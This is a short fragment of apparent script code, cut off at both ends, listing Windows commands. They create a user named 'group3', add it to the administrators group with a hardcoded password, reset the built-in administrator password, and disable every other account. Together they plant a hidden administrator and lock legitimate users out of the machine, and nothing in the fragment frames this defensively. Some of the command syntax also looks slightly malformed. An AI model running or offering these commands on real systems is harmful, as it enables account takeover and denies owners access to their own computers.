 ...
 commands = [ 
"net user /add group3", "net localgroup administrators /add group3 ED%Nr-A7#sJYa7K", "net user administrator 3u9j!Q@Td67??tUH",
"wmic useraccount where name!='group3'set disabled=true",
